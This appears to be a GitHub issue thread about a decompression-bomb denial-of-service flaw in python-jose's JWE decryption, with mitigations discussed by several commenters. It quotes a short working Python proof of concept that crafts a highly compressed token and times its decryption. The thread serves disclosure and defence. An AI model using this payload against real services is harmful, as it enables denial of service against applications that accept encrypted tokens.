### **[alistairwatts](/alistairwatts)** commented [May 7, 2024](#issuecomment-2097762814)

| Unfortunately the proposed fix just checks that the incoming uncompressed data is no more than than 250KB. I don't know what the maximum size a maliciously crafted 250KB token could expand to, but I imagine it could be significant. Some basic tests suggest that a 250KB token can expand to about 250MB.  In addition to sensibly checking the size of the compressed token, I would suggest changing the `decompress` function in `jwe.py` to use the `decompress` method on an instance of `zlib.Decompress`. The `decompress` method accepts a `max_length` which can limit the size of the decompressed data. |

| JWT bomb Attack in decode function0x01 Affected version vendor: <https://github.com/mpdavis/python-jose>  version: 3.3.0 0x02 What kind of vulnerability is it? Who is impacted? This vulnerability allows an attacker to cause a Denial-of-Service (DoS) condition by crafting a malicious JSON Web Encryption (JWE) token with an exceptionally high compression ratio. When this token is processed by the server, it results in significant memory allocation and processing time during decompression. 0x03 Vulnerability details The Proof of Concept (PoC) below demonstrates how this vulnerability can lead to a DoS attack:  ``` from jose import jwe  import time  s = '{"u": "' + "u" * 40000000 + '", "uu":"' + "u" * 40000000 + '"}'  print(len(s))  v1 = jwe.encrypt(s, b'asecret128bitkey', algorithm='A128KW', zip='DEF', encryption='A128GCM')  print(len(v1))  begin = time.time()  jwe.decrypt(v1, b'asecret128bitkey')  print(time.time() - begin)  s = '{"u": "' + "u" * 40000 + '", "uu":"' + "u" * 40000 + '"}'  v2 = jwe.encrypt(s, b'asecret128bitkey', algorithm='A128KW', encryption='A128GCM')  begin = time.time()  print(len(v2))  jwe.decrypt(v2, b'asecret128bitkey')  print(time.time() - begin) ```  This vulnerability is demonstrated by comparing the processing times of a compressed token to an uncompressed token of the same length. The compressed token's processing time is significantly higher, showcasing the vulnerability's potential impact. 0x04 Mitigation To mitigate this vulnerability, it is recommended to limit the maximum token length to 250K. This approach has also been adopted by the JWT library System.IdentityModel.Tokens.Jwt used in Microsoft Azure [1], effectively preventing attackers from exploiting this vulnerability with high compression ratio tokens. 0x05 References [1] [CVE-2024-21319](https://github.com/AzureAD/azure-activedirectory-identitymodel-extensions-for-dotnet/security/advisories/GHSA-8g9c-28fc-mcx2) |

| Hello [@P3ngu1nW](https://github.com/P3ngu1nW)  I'm fairly new to this field, so please bear with me. I've been trying to understand this issue and have read up on the JWT bomb attack.  To tackle it, do we simply need to cap the token size at 250K? If so, I've made the necessary changes in the decrypt function of my forked repository. Could you please review it and let me know if there's anything else required?  [Check the update](https://github.com/princekhunt/python-jose/blob/483529ee93a3ab510ab579d4d4cc644dba926ade/jose/jwe.py#L81)  Thank You, Prince |

| [@P3ngu1nW](https://github.com/P3ngu1nW) or [@alistairwatts](https://github.com/alistairwatts), thanks for reporting this CVE. It seems to be specific to tokens with compression. If I know that for my application, all valid tokens are uncompressed, is there a way how I could disable compression support in python-jose?  I also don't quite understand which functions of the library are affected:   * Issue title: "JWT bomb Attack in decode function" -> do you mean `jwt.decode()`? * Your example code is using `jwe.decrypt()`. * Is `jwt.decode()` affected or not?   Your description has a section "Who is impacted?", which is a good idea, but unfortunately does not contain enough information for non-crypto-experts to determine if their library usage is safe regarding this CVE or not. |

| [@heidemn-faro](https://github.com/heidemn-faro), if your application is not supporting encrypted tokens, then it doesn't look like the vulnerability affects you. You should be fine if you're not using `jose.jwe`, but please check this for yourself. If you wanted to be sure that this vulnerability doesn't affect your application then you could consider removing `jwe.py` from the `jose` package and checking your application is unaffected.  If `jose.jwe` is used then the following will monkey-patch the library and remove support for the `DEF` compression.  ``` import jose.constants jose.constants.ZIPS.SUPPORTED.discard('DEF') ``` |
